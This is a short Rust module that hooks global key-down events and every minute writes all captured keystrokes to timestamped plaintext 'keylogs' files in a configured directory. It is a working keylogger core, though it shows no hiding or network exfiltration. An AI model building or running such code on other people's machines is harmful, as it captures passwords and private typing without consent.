use crate::Config;
use chrono::Local;
use device_query::{DeviceEvents, DeviceState};
use anyhow::Result;
use std::sync::{Arc, RwLock};
use std::sync::mpsc;
use std::path::Path;
use std::fs::File;
use std::io::Write;
use std::time::Duration;
use std::thread;

pub fn run(config: Arc<RwLock<Config>>) -> Result<()>{
    let device_state = DeviceState::new();
    let (tx, rx): (mpsc::Sender<String>, mpsc::Receiver<_>) = mpsc::channel();


    let _guard = device_state.on_key_down(move |key| {
        tx.send(key.to_string()).unwrap();
    });

    loop {
        let current_log_dir = config.read().unwrap().get_current_logdir().clone();
        let log_dir = Path::new(&current_log_dir);

        thread::sleep(Duration::from_secs(60));

        let timestamp_formatted = Local::now().format("%Y-%m-%d-%H:%M:%S");
        let keylog_name = log_dir.join(format!("keylogs-{}.txt", timestamp_formatted));

        let mut file = match File::create(&keylog_name) {
            Ok(file) => file,
            Err(e) => {
                eprintln!("Failed to create {}: {}", keylog_name.to_str().unwrap(), e);
                continue;
            },
        };

        for msg in rx.try_iter() {
            write!(file, "{}\n",  msg).unwrap();
        }

        println!("Written to file");

    }
}





